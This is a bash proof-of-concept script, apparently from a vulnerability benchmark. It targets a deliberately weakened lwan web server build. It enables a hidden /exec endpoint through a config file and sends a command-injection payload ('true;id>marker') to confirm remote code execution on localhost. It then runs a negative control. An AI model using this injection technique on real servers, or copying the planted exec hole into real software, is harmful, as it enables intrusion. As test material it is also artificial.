#!/usr/bin/env bash
# PoC for 172_lwan_C2I2S3
# Axes: C2 (config file gate) / I2 (snprintf buffer) / S3 (strict_exec gated, bypass: not set)
#
# Gate: exec_mode and exec_logging from --exec-config file.
# S3: strict_exec static int defaults to 0 — metachar check never activated.
# I2: cmd flows through snprintf shell_cmd buffer before system().
#
# Usage: ./PoC.sh

set -euo pipefail

SAMPLE_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
BINARY="$SAMPLE_DIR/lwan"
WWWROOT="/tmp/poc_172_www"
MARKER="/tmp/poc_172_marker"
PORT=18172
NEG_PORT=19172
EXEC_CONF="/tmp/poc_172_exec.conf"

if [[ ! -x "$BINARY" ]]; then
    echo "[-] binary not found at $BINARY -- run build.sh first" >&2
    exit 1
fi

SERVER_PID=0

cleanup() {
    [[ $SERVER_PID -ne 0 ]] && {
        kill "$SERVER_PID" 2>/dev/null || true
        pkill -KILL -P "$SERVER_PID" 2>/dev/null || true
        wait "$SERVER_PID" 2>/dev/null || true
    }
    fuser -k ${PORT}/tcp 2>/dev/null || true
    rm -rf "$WWWROOT" "$MARKER" "$EXEC_CONF"
}
trap cleanup EXIT

mkdir -p "$WWWROOT"

cat > "$EXEC_CONF" <<CONFEOF
exec_mode = 1
exec_logging = 1
CONFEOF

echo "[*] starting lwan with --exec-config on port $PORT..."
"$BINARY" -r "$WWWROOT" -l "*:$PORT" --exec-config "$EXEC_CONF" &
SERVER_PID=$!
sleep 1.0

# S3 bypass: strict_exec=0 so metachar check never runs
# I2: cmd in sh -c '...' via snprintf; semicolons chain commands inside quotes
echo "[*] sending payload (S3 bypass — strict_exec=0): cmd=true;id>${MARKER}"
curl -sf "http://127.0.0.1:${PORT}/exec?cmd=true;id>${MARKER}" > /dev/null || true
sleep 0.3

if [[ -f "$MARKER" ]]; then
    echo "[+] RCE confirmed. Server executed:"
    cat "$MARKER"
else
    echo "[-] marker file not found -- exploit failed"
    exit 1
fi

# Negative control
echo "[*] verifying gate: endpoint must return 404 without --exec-config..."
kill "$SERVER_PID" 2>/dev/null || true
pkill -KILL -P "$SERVER_PID" 2>/dev/null || true
fuser -k ${PORT}/tcp 2>/dev/null || true
wait "$SERVER_PID" 2>/dev/null || true
SERVER_PID=0
sleep 0.3

"$BINARY" -r "$WWWROOT" -l "*:$NEG_PORT" &
SAFE_PID=$!
sleep 1.0
HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" \
    "http://127.0.0.1:${NEG_PORT}/exec?cmd=id" || echo "000")
kill "$SAFE_PID" 2>/dev/null || true
pkill -KILL -P "$SAFE_PID" 2>/dev/null || true
fuser -k ${NEG_PORT}/tcp 2>/dev/null || true
wait "$SAFE_PID" 2>/dev/null || true

if [[ "$HTTP_CODE" == "404" ]]; then
    echo "[+] gate check passed: got 404 without --exec-config"
else
    echo "[!] gate check: unexpected response $HTTP_CODE (expected 404)"
fi
